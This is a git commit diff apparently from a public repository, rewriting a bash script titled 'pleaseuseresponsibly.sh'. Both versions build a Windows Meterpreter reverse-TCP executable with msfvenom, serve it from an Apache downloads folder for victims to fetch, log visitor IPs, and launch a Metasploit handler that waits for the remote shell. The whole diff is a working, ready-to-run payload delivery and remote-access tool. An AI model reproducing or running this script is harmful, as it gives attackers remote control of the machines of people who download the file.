10975dfc05596943e1efe186dc8fbec149c96c53
810810810 <108226535+810810810@users.noreply.github.com>
2023-02-26 20:13:24 +0000

    Update pleaseuseresponsibly.sh

--- pleaseuseresponsibly.sh
+++ pleaseuseresponsibly.sh
@@ -1,53 +1,42 @@
 #!/bin/bash
 
-# Install Apache web server and Metasploit
-sudo apt-get update
-sudo apt-get install apache2 metasploit-framework -y
+# Set the local IP address
+LOCAL_IP=$(hostname -I | awk '{print $1}')
 
-# Set the name and path of the payload to be generated
-payloadname=payload_$(date +%s).exe
-payloadpath=/var/www/html/downloads/$payloadname
+# Set the payload name
+PAYLOAD_NAME="payload_$(date +%s).exe"
 
-# Get the IP address of the current machine
-ip=$(hostname -I | cut -d' ' -f1)
+# Set the Metasploit options
+LHOST=$LOCAL_IP
+LPORT=11506
 
-# Set the IP address and port of the listener
-lhost=$ip
-lport=$(shuf -i 4444-44444 -n 1)
+# Define the start_server function
+start_server() {
+  echo "Web server started at http://$LOCAL_IP/"
+  echo "To download the payload, visit http://$LOCAL_IP/downloads/$PAYLOAD_NAME"
+
+  # Start Apache web server
+  sudo systemctl start apache2
+
+  # Continuously print the access log to the terminal
+  echo "Visitors:"
+  sudo tail -f /var/log/apache2/access.log | awk '{print $1}'
+}
 
 # Generate the payload using msfvenom
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o $payloadpath
+echo "Generating payload..."
+sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o "/var/www/html/downloads/$PAYLOAD_NAME"
 
-# Set the permissions of the file so that it can be downloaded
-chmod 644 $payloadpath
+# Set the file permissions for the payload
+echo "Setting file permissions..."
+sudo chmod 644 "/var/www/html/downloads/$PAYLOAD_NAME"
 
-# Configure Apache to listen on all network interfaces and log requests to a file
-sudo sed -i 's/Listen 80/Listen 0.0.0.0:80/g' /etc/apache2/ports.conf
-sudo sed -i 's/#CustomLog/CutomLog/g' /etc/apache2/sites-available/000-default.conf
-sudo sed -i 's/#ErrorLog/ErrorLog/g' /etc/apache2/sites-available/000-default.conf
-sudo service apache2 restart
+# Start the Metasploit listener
+echo "Starting Metasploit listener..."
+gnome-terminal -- msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; run"
 
-# Start the Apache web server
-sudo systemctl start apache2
+# Start the web server and print the access log to the terminal
+start_server
 
-# Set up the Metasploit listener
-echo "use exploit/multi/handler" > /tmp/msfresource
-echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> /tmp/msfresource
-echo "set LHOST $lhost" >> /tmp/msfresource
-echo "set LPORT $lport" >> /tmp/msfresource
-echo "exploit -j" >> /tmp/msfresource
-x-terminal-emulator -e "msfconsole -q -r /tmp/msfresource"
-
-# Set up the logging terminal
-x-terminal-emulator -e "tail -f /var/log/apache2/access.log > /var/log/apache2/website.log"
-
-# Display the IP address and instructions for accessing the web server and payload
-echo "Web server started at http://${ip}/"
-echo "To download the payload, visit http://${ip}/downloads/$payloadname"
-echo "Metasploit listener set up on $lhost:$lport"
-
-# Wait for user to stop the script
-while true; do
-    sleep 1
-done
-
+# Stop the web server and Metasploit listener when the script is terminated
+trap 'echo "Stopping web server and Metasploit listener..."; sudo systemctl stop apache2; exit' SIGINT
